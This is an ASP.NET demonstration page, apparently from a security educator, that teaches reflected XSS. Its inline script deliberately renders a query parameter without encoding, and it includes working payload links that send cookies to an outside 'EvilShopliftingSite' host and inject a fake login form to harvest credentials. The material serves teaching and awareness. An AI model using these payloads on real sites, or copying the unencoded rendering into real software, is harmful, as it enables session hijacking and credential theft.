<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs" Inherits="ShopWithRobustSecurity.Default" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
  <title></title>
  <link href="Style.css" rel="stylesheet" />
</head>
<body>
  <form id="form1" method="post">
    <div class="content">
      <h1>This is a shop with <span>robust security</span></h1>
      <h2>(You can tell because it has a padlock)</h2>
      <img src="Images/Padlock.png" alt="Padlock" />
      <p>
        <span class="altSentence">Imagine this site is an online store.</span>
        What you probably didn&#39;t know when you clicked a link to this site was that it had an XSS payload in it (have a look at the address bar now). 
        <span class="altSentence">This &quot;secure&quot; site takes that XSS and renders it to the HTML, except it doesn&#39;t know how to output encode for the JavaScript context it&#39;s rendered in.</span>
        This means an attacker can give you a link which executes his code in your browser; this site lets that happen.
      </p>
      <p>
        <span class="altSentence">This site also doesn&#39;t flag all cookies as &quot;HTTP only&quot; which means the attacker can access them with his XSS payload.</span>
        Cookies on this site include personal information and other data which could allow an attacker to hijack your session.
        <span class="altSentence">If he hijacks your session, he has access to all your other personal data stored on the site; your address, your phone number and portions of your credit card information.</span>
        If you followed the link to this site with the XSS payload while you were logged in to the store, all this information was sent to the attacker.
        <span class="altSentence">You didn't even know it happened because the information was sent asynchronously.</span> <a href="/?LegitParam=%22;var xmlhttp=new XMLHttpRequest();xmlhttp.open('GET','http://EvilShopliftingSite.apphb.com/GetCookies.aspx?Cookies='%2Bdocument.cookie,true);xmlhttp.send();%22">Click here</a> if you'd like to (not) see it happen again or cannot see the XSS payload in the address bar.</a>
      </p>
      <p>
        <span class="altSentence">XSS can also be used to completely change the behaviour of the site.</span>
        How about we <a href="/?LegitParam=%22;document.forms%5B0%5D.action='http://EvilShopliftingSite.apphb.com/StealLogon.aspx';document.write('%3Cdiv%20style=\'position:absolute;background-color:rgb(154,%20152,%20152);color:rgb(31,%2030,%2030);top:50%;left:50%;width:500px;height:180px;margin-top:-90px;margin-left:-250px;border:5px%20solid%20rgb(255,%20152,%2023);padding:10px;\'%3E%3Cp%3EFree%20shopping%20this%20week!%20Just%20logon%20below.%3C/p%3EUsername:%20%3Cinput%20type=text%20name=username%3E%3Cbr%3EPassword:%20%3Cinput%20type=password%20name=password%3E%3Cbr%3E%3Cinput%20type=submit%3E%3C/div%3E');%22">place a logon form on this page</a> and tempt you to hand over your credentials?
        <span class="altSentence">The same practice can be used to redirect links, change page contents or even serve you malware.</span>
      </p>
      <p class="explanation">
        Of course this is not a real store and you have no personal information here for an attacker to harvest.
        However, if you <em>do</em> have an account at an online store that follows the practices above, one little click on one little link is all it might take for an attacker to start harvesting your personal data.
        Different browsers implement different levels of defence against XSS so you may or may not see the full experience.
        Further information on the context of this site will soon be up on <a href="http://troyhunt.com">troyhunt.com</a>.
      </p>
      <p class="explanation">
        If you'd like to see the source code for this site, it's up on GitHub under <a href="https://github.com/troyhunt/ShopWithRobustSecurity">ShopWithRobustSecurity</a>.
      </p>
    </div>
    <script type="text/javascript">
      // There are many cases for referencing untrusted data (including user input) in JavaScript.
      var foo = "some string concatenation with untrusted data: (<%= Request.QueryString["LegitParam"] %>)";
      // Normally something would now happen with foo.
      
      // Now compare the unencoded string above to one encoded specifically for the JavaScript output context:
      // <%= Microsoft.Security.Application.Encoder.JavaScriptEncode(Request.QueryString["LegitParam"]) %>
    </script>
  </form>
</body>
</html>
